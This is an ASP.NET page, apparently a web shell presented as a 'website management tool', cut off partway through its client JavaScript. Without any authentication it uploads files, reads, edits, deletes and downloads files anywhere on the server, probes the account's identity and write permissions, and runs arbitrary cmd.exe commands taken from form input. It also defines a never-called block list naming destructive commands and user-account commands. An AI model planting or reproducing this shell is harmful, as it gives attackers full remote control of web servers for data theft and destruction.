<%@ Page Language="C#" AutoEventWireup="true" %> 
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    // 用于文件管理的当前路径
    protected string currentPath;

	protected void Page_Load(object sender, EventArgs e)
	{
		// 处理上传请求
		if (Request["upload"] == "1" && Request.Files.Count > 0)
		{
			// 获取当前目录（上传时由前端传入）
			string currentDirectory = Request.Form["path"];
			if (string.IsNullOrEmpty(currentDirectory))
			{
				currentDirectory = Path.GetDirectoryName(Request.PhysicalPath);
			}
			// 获取上传的文件（input 的 name 必须为 uploadFile）
			HttpPostedFile uploadedFile = Request.Files["uploadFile"];
			string savePath = Path.Combine(currentDirectory, Path.GetFileName(uploadedFile.FileName));
			uploadedFile.SaveAs(savePath);
			// 返回上传成功标识
			Response.Write("UPLOAD_SUCCESS");
			Response.End();
		}

		// 处理文件管理面板请求
        if (Request.Form["menu"] == "file")
        {
            string currentPagePath = Request.PhysicalPath;
            string currentDirectory = Path.GetDirectoryName(currentPagePath);
            string requestedPath = Request.Form["path"];
            if (string.IsNullOrEmpty(requestedPath))
            {
                currentPath = currentDirectory;
            }
            else
            {
                currentPath = requestedPath;
            }
        }
        else
        {
            // 初次加载页面时，默认显示文件管理并设置当前路径
            // 检查是否是回发，如果不是回发则是初次加载
            if (!IsPostBack)
            {
                currentPath = Path.GetDirectoryName(Request.PhysicalPath);
            }
            else
            {
                currentPath = "";
            }
        }

		// 处理重命名和删除操作,读取文件内容,读取文件内容
        string action = Request.Form["action"];
        if (action == "rename")
        {
            string currentPath = Request.Form["currentPath"];
            string newName = Request.Form["newName"];
            RenameFile(currentPath, newName);
        }
        else if (action == "delete")
        {
            string currentPath = Request.Form["currentPath"];
            DeleteFile(currentPath);
        }
        else if (action == "readfile")
        {
            string filePath = Request.Form["filePath"];
            string content = ReadFileContent(filePath);
            WriteResponse(content);
        }
        else if (action == "savefile")
        {
            string filePath = Request.Form["filePath"];
            string content = Request.Form["content"];
            SaveFileContent(filePath, content);
        }
                // 处理文件下载
        else if (action == "download")
        {
            string filePath = Request.Form["filePath"];
            DownloadFile(filePath);
        }
                // 处理新建文件和文件夹
        else if (action == "createfile")
        {
            string filePath = Request.Form["filePath"];
            string content = Request.Form["content"] ?? "";
            CreateNewFile(filePath, content);
        }
        else if (action == "createfolder")
        {
            string folderPath = Request.Form["folderPath"];
            CreateNewFolder(folderPath);
        }
        // 处理压缩操作
        else if (action == "compress")
        {
            string targetPath = Request.Form["targetPath"];
            string zipPath = Request.Form["zipPath"];
            CompressDirectory(targetPath, zipPath);
        }
        else if (action == "getpermissions")
        {
            string permissionInfo = GetCurrentUserInfo();
            WriteResponse(permissionInfo);
        }
        // 处理命令执行
        else if (action == "executecommand")
        {
            string command = Request.Form["command"];
            string result = ExecuteCommand(command);
            WriteResponse(result);
        }

	}

// 获取当前目录（用于命令提示符）
protected string GetCurrentDirectory()
{
    try
    {
        if (!string.IsNullOrEmpty(currentPath) && Directory.Exists(currentPath))
        {
            return currentPath;
        }
        return Path.GetDirectoryName(Request.PhysicalPath);
    }
    catch
    {
        return "C:\\";
    }
}

// 执行命令
protected string ExecuteCommand(string command)
{
    try
    {
        
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + command;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WorkingDirectory = GetCurrentDirectory();
        
        process.Start();
        
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        
        process.WaitForExit();
        
        if (!string.IsNullOrEmpty(error))
        {
            return error;
        }
        
        return output;
    }
    catch (Exception ex)
    {
        return "执行命令时出错: " + ex.Message;
    }
}

// 检查危险命令
private bool IsDangerousCommand(string command)
{
    string[] dangerousCommands = {
        "format", "del /f /s /q", "rd /s /q", "rmdir /s /q",
        "shutdown", "taskkill", "net user", "net localgroup"
    };
    
    string lowerCommand = command.ToLower();
    
    foreach (string dangerous in dangerousCommands)
    {
        if (lowerCommand.Contains(dangerous))
        {
            return true;
        }
    }
    
    return false;
}


// 压缩目录
private void CompressDirectory(string sourceDirectory, string zipFilePath)
{
    try
    {
        if (string.IsNullOrEmpty(sourceDirectory) || string.IsNullOrEmpty(zipFilePath))
        {
            WriteResponse("EMPTY_PATH");
            return;
        }

        // 检查源路径是否存在
        if (!Directory.Exists(sourceDirectory))
        {
            WriteResponse("PATH_NOT_FOUND");
            return;
        }

        // 检查目标zip文件是否已存在
        if (File.Exists(zipFilePath))
        {
            WriteResponse("ZIP_EXISTS");
            return;
        }

        // 确保目标目录存在
        string zipDirectory = Path.GetDirectoryName(zipFilePath);
        if (!Directory.Exists(zipDirectory))
        {
            Directory.CreateDirectory(zipDirectory);
        }

        // 检查源目录是否为空
        if (IsDirectoryEmpty(sourceDirectory))
        {
            WriteResponse("DIRECTORY_EMPTY");
            return;
        }

        // 使用PowerShell进行压缩
        bool success = CompressWithPowerShell(sourceDirectory, zipFilePath);
        
        if (success)
        {
            WriteResponse("COMPRESS_SUCCESS:" + Path.GetFileName(zipFilePath));
        }
        else
        {
            // 如果失败，清理可能生成的部分文件
            if (File.Exists(zipFilePath))
            {
                try { File.Delete(zipFilePath); } catch { }
            }
            WriteResponse("COMPRESS_FAILED: PowerShell compression failed");
        }
    }
    catch (UnauthorizedAccessException)
    {
        WriteResponse("ACCESS_DENIED");
    }
    catch (IOException ex)
    {
        WriteResponse("IO_ERROR: " + ex.Message);
    }
    catch (Exception ex)
    {
        WriteResponse("COMPRESS_FAILED: " + ex.Message);
    }
}

// 检查目录是否为空
private bool IsDirectoryEmpty(string path)
{
    return !Directory.EnumerateFileSystemEntries(path).Any();
}

// 使用PowerShell进行压缩
private bool CompressWithPowerShell(string sourceDirectory, string zipFilePath)
{
    System.Diagnostics.Process process = null;
    string tempScript = null;
    try
    {
        // 创建临时脚本文件
        tempScript = Path.GetTempPath() + "compress_" + Guid.NewGuid().ToString() + ".ps1";
        
        string scriptContent = @"
param(
    [string]$SourcePath,
    [string]$ZipPath
)

try {
    # 检查源目录
    if (-not (Test-Path $SourcePath -PathType Container)) {
        Write-Error ""Source directory does not exist: $SourcePath""
        exit 1
    }
    
    # 检查目标目录
    $zipDir = [System.IO.Path]::GetDirectoryName($ZipPath)
    if (-not (Test-Path $zipDir -PathType Container)) {
        New-Item -ItemType Directory -Path $zipDir -Force | Out-Null
    }
    
    # 加载压缩程序集
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    
    # 创建ZIP文件
    [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    
    # 验证ZIP文件
    if (Test-Path $ZipPath -PathType Leaf) {
        $fileInfo = Get-Item $ZipPath
        if ($fileInfo.Length -gt 0) {
            Write-Output ""SUCCESS""
            exit 0
        }
    }
    Write-Error ""ZIP file creation failed""
    exit 1
}
catch {
    Write-Error $_.Exception.Message
    exit 1
}
";
        
        File.WriteAllText(tempScript, scriptContent, System.Text.Encoding.UTF8);
        
        process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "powershell.exe";
        process.StartInfo.Arguments = string.Format(
            "-ExecutionPolicy Bypass -File \"{0}\" -SourcePath \"{1}\" -ZipPath \"{2}\"",
            tempScript, sourceDirectory, zipFilePath
        );
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        
        process.Start();
        
        // 读取输出和错误信息
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        
        bool exited = process.WaitForExit(60000);
        
        if (!exited)
        {
            process.Kill();
            return false;
        }
        
        // 检查是否成功
        bool success = process.ExitCode == 0 && 
                      File.Exists(zipFilePath) && 
                      new FileInfo(zipFilePath).Length > 0;
        
        return success;
    }
    catch
    {
        return false;
    }
    finally
    {
        // 清理临时脚本文件
        if (tempScript != null && File.Exists(tempScript))
        {
            try { File.Delete(tempScript); } catch { }
        }
        
        if (process != null)
        {
            process.Close();
            process.Dispose();
        }
    }
}

        // 读取文件内容
    protected string ReadFileContent(string filePath)
    {
        try
        {
            if (File.Exists(filePath))
            {
                return File.ReadAllText(filePath, System.Text.Encoding.UTF8);
            }
            return "FILE_NOT_FOUND";
        }
        catch (Exception ex)
        {
            return "READ_ERROR: " + ex.Message;
        }
    }

    // 保存文件内容
    protected void SaveFileContent(string filePath, string content)
    {
        try
        {
            File.WriteAllText(filePath, content, System.Text.Encoding.UTF8);
            WriteResponse("SAVE_SUCCESS");
        }
        catch (Exception ex)
        {
            WriteResponse("SAVE_ERROR: " + ex.Message);
        }
    }

// 删除文件或目录
private void DeleteFile(string path)
{
    try
    {
        if (File.Exists(path))
        {
            // 删除文件
            File.Delete(path);
            WriteResponse("DELETE_SUCCESS");
        }
        else if (Directory.Exists(path))
        {
            // 删除目录（包括所有子目录和文件）
            Directory.Delete(path, true);
            WriteResponse("DELETE_SUCCESS");
        }
        else
        {
            WriteResponse("FILE_NOT_FOUND");
        }
    }
    catch (UnauthorizedAccessException)
    {
        WriteResponse("ACCESS_DENIED");
    }
    catch (IOException ex)
    {
        WriteResponse("IO_ERROR: " + ex.Message);
    }
    catch (Exception ex)
    {
        WriteResponse("DELETE_FAILED: " + ex.Message);
    }
}

// 显示当前权限信息
protected string GetCurrentUserInfo()
{
    try
    {
        StringBuilder sb = new StringBuilder();
        
        // 当前Windows用户
        sb.AppendLine("Windows Identity: " + WindowsIdentity.GetCurrent().Name);
        sb.AppendLine("Authentication Type: " + WindowsIdentity.GetCurrent().AuthenticationType);
        
        // 当前线程用户
        sb.AppendLine("Thread Identity: " + System.Threading.Thread.CurrentPrincipal.Identity.Name);
        sb.AppendLine("Is Authenticated: " + System.Threading.Thread.CurrentPrincipal.Identity.IsAuthenticated);
        
        // IIS应用程序池身份
        sb.AppendLine("Process User: " + Environment.UserName);
        sb.AppendLine("Process Domain: " + Environment.UserDomainName);
        
        // 检查常用目录的权限
        string[] testPaths = {
            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Path.GetTempPath(),
            Path.GetDirectoryName(Request.PhysicalPath)
        };
        
        sb.AppendLine("\n目录权限检查:");
        foreach (string path in testPaths)
        {
            if (Directory.Exists(path))
            {
                try
                {
                    string testFile = Path.Combine(path, "test_permission.tmp");
                    File.WriteAllText(testFile, "test");
                    File.Delete(testFile);
                    sb.AppendLine("✓ " + path + " - 有写入权限");
                }
                catch (UnauthorizedAccessException)
                {
                    sb.AppendLine("✗ " + path + " - 无写入权限");
                }
                catch (Exception ex)
                {
                    sb.AppendLine("? " + path + " - " + ex.GetType().Name);
                }
            }
        }
        
        return sb.ToString();
    }
    catch (Exception ex)
    {
        return "获取权限信息失败: " + ex.Message;
    }
}

        private void RenameFile(string filePath, string newName)
        {
            try
            {
                if (string.IsNullOrEmpty(filePath) || string.IsNullOrEmpty(newName))
                {
                    WriteResponse("EMPTY_PARAMETERS");
                    return;
                }

                if (!File.Exists(filePath) && !Directory.Exists(filePath))
                {
                    WriteResponse("FILE_NOT_FOUND");
                    return;
                }

                string directory = Path.GetDirectoryName(filePath);
                string newFilePath = Path.Combine(directory, newName);

                // 检查新文件路径是否已存在
                if (File.Exists(newFilePath) || Directory.Exists(newFilePath))
                {
                    WriteResponse("FILE_EXISTS");
                    return;
                }

                // 检查新文件名是否合法
                if (newName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                {
                    WriteResponse("INVALID_NAME");
                    return;
                }

                if (filePath != newFilePath) // 确保新旧文件名不同
                {
                    if (File.Exists(filePath))
                    {
                        File.Move(filePath, newFilePath);
                    }
                    else if (Directory.Exists(filePath))
                    {
                        Directory.Move(filePath, newFilePath);
                    }
                    WriteResponse("RENAME_SUCCESS");
                }
                else
                {
                    WriteResponse("SAME_NAME");
                }
            }
            catch (UnauthorizedAccessException)
            {
                WriteResponse("ACCESS_DENIED");
            }
            catch (IOException ex)
            {
                WriteResponse("IO_ERROR: " + ex.Message);
            }
            catch (Exception ex)
            {
                WriteResponse("RENAME_FAILED: " + ex.Message);
            }
        }
        // 下载文件
        private void DownloadFile(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    FileInfo fileInfo = new FileInfo(filePath);
                    
                    // 设置响应头
                    Response.Clear();
                    Response.ContentType = GetMimeType(fileInfo.Extension);
                    Response.AddHeader("Content-Disposition", "attachment; filename=\"" + HttpUtility.UrlEncode(fileInfo.Name, System.Text.Encoding.UTF8) + "\"");
                    Response.AddHeader("Content-Length", fileInfo.Length.ToString());
                    
                    // 输出文件内容
                    Response.TransmitFile(filePath);
                    Response.Flush();
                    Response.End();
                }
                else
                {
                    WriteResponse("FILE_NOT_FOUND");
                }
            }
            catch (Exception ex)
            {
                WriteResponse("DOWNLOAD_ERROR: " + ex.Message);
            }
        }

        // 获取文件的MIME类型
        private string GetMimeType(string extension)
        {
            switch (extension.ToLower())
            {
                case ".txt": return "text/plain";
                case ".html": case ".htm": return "text/html";
                case ".css": return "text/css";
                case ".js": return "application/javascript";
                case ".json": return "application/json";
                case ".xml": return "application/xml";
                case ".pdf": return "application/pdf";
                case ".jpg": case ".jpeg": return "image/jpeg";
                case ".png": return "image/png";
                case ".gif": return "image/gif";
                case ".bmp": return "image/bmp";
                case ".zip": return "application/zip";
                case ".rar": return "application/x-rar-compressed";
                case ".7z": return "application/x-7z-compressed";
                case ".exe": return "application/octet-stream";
                case ".msi": return "application/octet-stream";
                case ".doc": return "application/msword";
                case ".docx": return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
                case ".xls": return "application/vnd.ms-excel";
                case ".xlsx": return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
                case ".ppt": return "application/vnd.ms-powerpoint";
                case ".pptx": return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
                default: return "application/octet-stream";
            }
        }


        // 新建文件
        private void CreateNewFile(string filePath, string content)
        {
            try
            {
                if (string.IsNullOrEmpty(filePath))
                {
                    WriteResponse("EMPTY_PATH");
                    return;
                }

                // 检查文件是否已存在
                if (File.Exists(filePath))
                {
                    WriteResponse("FILE_EXISTS");
                    return;
                }

                // 检查文件名是否合法
                string fileName = Path.GetFileName(filePath);
                if (fileName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                {
                    WriteResponse("INVALID_NAME");
                    return;
                }

                // 确保目录存在
                string directory = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                // 创建文件
                File.WriteAllText(filePath, content, System.Text.Encoding.UTF8);
                WriteResponse("CREATE_SUCCESS");
            }
            catch (UnauthorizedAccessException)
            {
                WriteResponse("ACCESS_DENIED");
            }
            catch (IOException ex)
            {
                WriteResponse("IO_ERROR: " + ex.Message);
            }
            catch (Exception ex)
            {
                WriteResponse("CREATE_FAILED: " + ex.Message);
            }
        }

        // 新建文件夹
        private void CreateNewFolder(string folderPath)
        {
            try
            {
                if (string.IsNullOrEmpty(folderPath))
                {
                    WriteResponse("EMPTY_PATH");
                    return;
                }

                // 检查文件夹是否已存在
                if (Directory.Exists(folderPath))
                {
                    WriteResponse("FOLDER_EXISTS");
                    return;
                }

                // 检查文件夹名是否合法
                string folderName = Path.GetFileName(folderPath);
                if (folderName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                {
                    WriteResponse("INVALID_NAME");
                    return;
                }

                // 创建文件夹
                Directory.CreateDirectory(folderPath);
                WriteResponse("CREATE_SUCCESS");
            }
            catch (UnauthorizedAccessException)
            {
                WriteResponse("ACCESS_DENIED");
            }
            catch (IOException ex)
            {
                WriteResponse("IO_ERROR: " + ex.Message);
            }
            catch (Exception ex)
            {
                WriteResponse("CREATE_FAILED: " + ex.Message);
            }
        }


        // 修改后的 WriteResponse 方法
        private void WriteResponse(string message)
        {
            Response.Clear();
            Response.Write(message);
            Response.Flush();
            Response.SuppressContent = true;
            HttpContext.Current.ApplicationInstance.CompleteRequest();
        }




    // 根据文件/目录生成图标
    protected string GetIcon(string fileName, bool isDirectory)
    {
        if (isDirectory) return "📁";
        string ext = Path.GetExtension(fileName).ToLower();
        switch (ext)
        {
            case ".txt": case ".doc": case ".docx": case ".csv": 
            case ".xls": case ".xlsx": case ".pdf": return "📄";
            case ".jpg": case ".png": case ".gif": return "🖼️";
            case ".zip": case ".rar": case ".7z": return "📦";
            case ".exe": case ".bat": case ".dll": return "⚙️";
            case ".mp3": case ".wav": return "🎵";
            case ".mp4": case ".avi": return "🎬";
            default: return "📄";
        }
    }

    // 获取文件或目录权限（简单示例）
    protected string GetPermissions(string path)
    {
        try
        {
            FileAttributes attributes = File.GetAttributes(path);
            if ((attributes & FileAttributes.System) == FileAttributes.System)
            {
                return "System";
            }
            if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
            {
                return "Hidden";
            }
            return "R/W";
        }
        catch (UnauthorizedAccessException)
        {
            return "No Access";
        }
        catch (Exception)
        {
            return "N/A";
        }
    }

    // 获取文件或目录最后修改时间
    protected string GetLastModified(string path)
    {
        try
        {
            if (File.Exists(path))
            {
                return File.GetLastWriteTime(path).ToString("yyyy/MM/dd HH:mm:ss");
            }
            else if (Directory.Exists(path))
            {
                return Directory.GetLastWriteTime(path).ToString("yyyy/MM/dd HH:mm:ss");
            }
            else
            {
                return "N/A";
            }
        }
        catch (UnauthorizedAccessException)
        {
            return "Access Denied";
        }
        catch (Exception)
        {
            return "Error";
        }
    }

    // 获取所有磁盘根目录
    protected string[] GetDrives()
    {
        return Directory.GetLogicalDrives();
    }
</script>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>网站管理工具</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%; overflow: hidden;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
        }
        /* 外层工具窗口 */
        .container {
            width: 90%;
            height: 90%;
            margin: auto;
            margin-top: 20px;
            background: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            display: flex;
            flex-direction: column;
        }
        /* 标题和菜单 */
        .header {
            background: #333;
            color: #fff;
            padding: 10px;
            display: flex;
            align-items: center;
        }
        .header .title {
            font-size: 18px;
            margin-right: 20px;
        }
        .menu a {
            margin-right: 15px;
            color: #fff;
            text-decoration: none;
            cursor: pointer;
            padding: 5px 10px;
        }
        .menu a.active {
            background-color: #555;
            border-radius: 3px;
        }
        /* 内容区域，各功能模块均放在此 */
        .content {
            flex: 1;
            padding: 10px;
            overflow: hidden;
            display: none;
        }
        .content.active {
            display: block;
        }
        /* 文件管理区域 */
        .file-toolbar {
            margin-bottom: 5px;
        }
        .file-toolbar input[type="text"] {
            width: 60%;
            padding: 3px;
            font-size: 12px;
        }
        .file-toolbar select, .file-toolbar button {
            padding: 3px 5px;
            font-size: 12px;
        }
        /* 文件管理容器分为左右两部分 */
        .file-container {
            display: flex;
            height: calc(100% - 50px);
        }
        /* 左侧：磁盘列表框 */
        .file-sidebar {
            width: 200px;
            border: 1px solid #ccc;
            margin-right: 10px;
            overflow-y: auto;
            padding: 5px;
            background-color: #fafafa;
        }
        .file-sidebar h3 {
            margin-top: 0;
            font-size: 16px;
            border-bottom: 1px solid #ddd;
            padding-bottom: 5px;
        }
        .file-sidebar form {
            margin-bottom: 5px;
        }
        .file-sidebar button {
            width: 100%;
            padding: 5px;
            margin-bottom: 5px;
            font-size: 12px;
        }
        /* 右侧：文件目录展示框 */
        .file-main {
            flex: 1;
            border: 1px solid #ccc;
            overflow-y: auto;
            padding: 5px;
            background-color: #fff;
        }
        .file-main h2 {
            margin-top: 0;
            font-size: 16px;
            border-bottom: 1px solid #ddd;
            padding-bottom: 5px;
        }
        .file-main table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-main th, .file-main td {
            border: 1px solid #ddd;
            padding: 5px;
            text-align: left;
            font-size: 12px;
        }
        .file-main th {
            background-color: #eee;
        }
        /* 选中行背景色 */
        .selected {
            background-color: #cce5ff;
        }
        /* 编辑框样式 */
        .edit-box {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            z-index: 1001;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            width: 80%;
            height: 80%;
            max-width: 800px;
            max-height: 600px;
        }
        .edit-box textarea {
            width: 100%;
            height: calc(100% - 60px);
            font-family: Consolas, Monaco, 'Courier New', monospace;
            font-size: 14px;
            resize: none;
            border: 1px solid #ddd;
            padding: 10px;
        }
        .edit-box .edit-buttons {
            margin-top: 10px;
            text-align: right;
        }
        /* 右键菜单样式 */
        .context-menu {
            display: none;
            position: absolute;
            background: #fff;
            border: 1px solid #ccc;
            z-index: 1000;
            box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
        }
        .context-menu ul {
            list-style: none;
            margin: 0;
            padding: 0;
        }
        .context-menu li {
            padding: 8px 12px;
            cursor: pointer;
        }
        .context-menu li:hover {
            background-color: #f0f0f0;
        }

        /* 编辑框按钮样式 */
        .edit-buttons button {
            padding: 8px 16px;
            margin: 0 5px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .edit-buttons button:first-child {
            background: #4CAF50;
            color: white;
        }

        .edit-buttons button:last-child {
            background: #f44336;
            color: white;
        }

        #createButton {
            background: #2196F3 !important;
            color: white;
        }

/* 压缩进度样式 */
#compressProgress {
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
}

/* 加载动画 */
.spinner {
    border: 3px solid #f3f3f3;
    border-top: 3px solid #3498db;
    border-radius: 50%;
    width: 30px;
    height: 30px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

        /* 右键菜单压缩项样式 */
        .context-menu li[onclick="contextCompress()"] {
            position: relative;
        }


/* 命令执行模块样式 */
.terminal-container {
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
    background-color: #1e1e1e;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
}

.terminal-header {
    background-color: #2d2d30;
    padding: 10px 15px;
    border-bottom: 1px solid #3e3e42;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.terminal-title {
    font-weight: bold;
    color: #cccccc;
}

.terminal-controls {
    display: flex;
}

.control-btn {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    margin-left: 8px;
    cursor: pointer;
}

.close { background-color: #ff5f57; }
.minimize { background-color: #ffbd2e; }
.maximize { background-color: #28ca42; }

.terminal-body {
    flex: 1;
    padding: 15px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
}

.output-container {
    flex: 1;
    overflow-y: auto;
    margin-bottom: 10px;
}

.output-line {
    margin-bottom: 5px;
    line-height: 1.4;
    word-break: break-all;
}

.command-line {
    display: flex;
    align-items: center;
    margin-top: 5px;
}

.prompt {
    margin-right: 10px;
    color: #00ff00;
}

.command-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 14px;
}

.btn-execute {
    background-color: #007acc;
    color: white;
    border: none;
    padding: 5px 15px;
    margin-left: 10px;
    cursor: pointer;
    border-radius: 3px;
}

.btn-execute:hover {
    background-color: #005a9e;
}

.btn-clear {
    background-color: #333;
    color: #ccc;
    border: none;
    padding: 5px 15px;
    margin-left: 10px;
    cursor: pointer;
    border-radius: 3px;
}

.btn-clear:hover {
    background-color: #444;
}

/* 命令执行模块滚动条样式 */
#panelCommand ::-webkit-scrollbar {
    width: 10px;
}

#panelCommand ::-webkit-scrollbar-track {
    background: #252526;
}

#panelCommand ::-webkit-scrollbar-thumb {
    background: #424242;
    border-radius: 5px;
}

#panelCommand ::-webkit-scrollbar-thumb:hover {
    background: #4e4e4e;
}
    </style>
    <script>
        var currentFilePath = ""; // 当前选中行的路径
        var currentRow = null;    // 当前选中的表格行
        var contextMenu = null;   // 右键菜单对象

// 压缩功能
function contextCompress() {
    if (!currentFilePath) {
        alert("请先选择要压缩的目录");
        hideContextMenu();
        return;
    }

    var isDirectory = currentRow.getAttribute("data-is-directory") === "true";
    
    if (!isDirectory) {
        alert("当前只支持目录压缩，请选择目录进行操作");
        hideContextMenu();
        return;
    }

    var dirName = currentFilePath.split('/').pop().split('\\').pop();
    var defaultZipName = dirName + ".zip";
    var currentPath = document.getElementById("pathInput").value;
    
    var zipPath = prompt(
        "压缩目录\n\n" +
        "目录: " + dirName + "\n" +
        "压缩文件将保存到当前目录\n" +
        "请输入压缩文件名称:",
        defaultZipName
    );
    
    if (!zipPath) {
        hideContextMenu();
        return;
    }

    // 确保文件扩展名是 .zip
    if (!zipPath.toLowerCase().endsWith('.zip')) {
        zipPath += '.zip';
    }

    // 构建完整的压缩文件路径
    var fullZipPath = currentPath.endsWith("\\") ? currentPath + zipPath : currentPath + "\\" + zipPath;

    // 验证文件名
    if (!isValidFileName(zipPath.replace('.zip', ''))) {
        alert("压缩文件名称包含非法字符！\n不允许的字符: \\ / : * ? \" < > |");
        hideContextMenu();
        return;
    }

    // 显示压缩进度提示
    showCompressProgress();

    // 执行压缩
    performCompress(currentFilePath, fullZipPath);
    
    hideContextMenu();
}

// 执行压缩操作
function performCompress(sourcePath, zipPath) {
    var formData = new FormData();
    formData.append("action", "compress");
    formData.append("targetPath", sourcePath);
    formData.append("zipPath", zipPath);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", window.location.href, true);
    
    xhr.onload = function() {
        if (xhr.status === 200) {
            var responseText = xhr.responseText.trim();
            handleCompressResponse(responseText, sourcePath, zipPath);
        } else {
            hideCompressProgress();
            alert("压缩请求失败，请稍后再试。");
        }
    };
    
    xhr.onerror = function() {
        hideCompressProgress();
        alert("网络错误，请检查连接。");
    };
    
    xhr.send(formData);
}

// 处理压缩响应
function handleCompressResponse(response, sourcePath, zipPath) {
    hideCompressProgress();
    
    if (response.startsWith("COMPRESS_SUCCESS:")) {
        var fileName = response.split(":")[1];
        showNotification("压缩成功！生成文件: " + fileName, "success");
        // 刷新当前目录
        setTimeout(() => {
            document.getElementById("fileForm").submit();
        }, 1000);
    } else {
        switch(response) {
            case "PATH_NOT_FOUND":
                alert("要压缩的目录不存在！");
                break;
            case "ZIP_EXISTS":
                alert("压缩文件已存在，请使用其他名称！");
                break;
            case "DIRECTORY_EMPTY":
                alert("目录为空，无法压缩！");
                break;
            case "ACCESS_DENIED":
                alert("没有权限进行压缩操作！");
                break;
            case "EMPTY_PATH":
                alert("路径不能为空！");
                break;
            default:
                if (response.startsWith("IO_ERROR") || response.startsWith("COMPRESS_FAILED")) {
                    var errorMsg = response.split(":")[1] || "未知错误";
                    alert("压缩失败：" + errorMsg);
                } else {
                    alert("压缩失败：PowerShell压缩失败");
                }
        }
    }
}

// 显示压缩进度
function showCompressProgress() {
    var progressDiv = document.getElementById("compressProgress");
    if (!progressDiv) {
        progressDiv = document.createElement("div");
        progressDiv.id = "compressProgress";
        progressDiv.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 8px;
            z-index: 10002;
            text-align: center;
            min-width: 200px;
        `;
        progressDiv.innerHTML = `
            <div style="margin-bottom: 10px;">
                <div class="spinner"></div>
            </div>
            <div id="compressProgressText">正在压缩目录，请稍候...</div>
        `;
        document.body.appendChild(progressDiv);
    }
    
    progressDiv.style.display = "block";
}

// 隐藏压缩进度
function hideCompressProgress() {
    var progressDiv = document.getElementById("compressProgress");
    if (progressDiv) {
        progressDiv.style.display = "none";
    }
}

// 文件名验证函数（如果还没有的话）
function isValidFileName(name) {
    var invalidChars = /[\\/:*?"<>|]/;
    return !invalidChars.test(name) && name.trim() !== "";
}

// 显示通知函数（如果还没有的话）
function showNotification(message, type) {
    var notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === "success" ? "#4CAF50" : "#f44336"};
        color: white;
        padding: 15px;
        border-radius: 5px;
        z-index: 10000;
        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        max-width: 300px;
        transition: all 0.3s ease;
    `;
    notification.innerHTML = message;
    
    document.body.appendChild(notification);
    
    setTimeout(function() {
        notification.style.opacity = "0";
        notification.style.transform = "translateX(100%)";
        setTimeout(function() {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 3000);
}
        // 判断文件是否可编辑
        function isEditableFile(filePath) {
            var editableExtensions = ['.txt', '.html', '.htm', '.css', '.js', '.json', '.xml', '.config', '.bat', '.cmd', '.ps1', '.sh', '.php', '.asp', '.aspx', '.cs', '.vb', '.java', '.py', '.md', '.log', '.ini', '.yml', '.yaml'];
            var ext = filePath.substring(filePath.lastIndexOf('.')).toLowerCase();
            return editableExtensions.indexOf(ext) > -1;
        }

        // 判断文件是否可查看（文本文件）
        function isViewableFile(filePath) {
            var viewableExtensions = ['.txt', '.log', '.md', '.ini', '.cfg', '.conf', '.properties', '.sql', '.csv', '.tsv'];
            var ext = filePath.substring(filePath.lastIndexOf('.')).toLowerCase();
            return viewableExtensions.indexOf(ext) > -1;
        }

        // 判断文件是否是图片
        function isImageFile(filePath) {
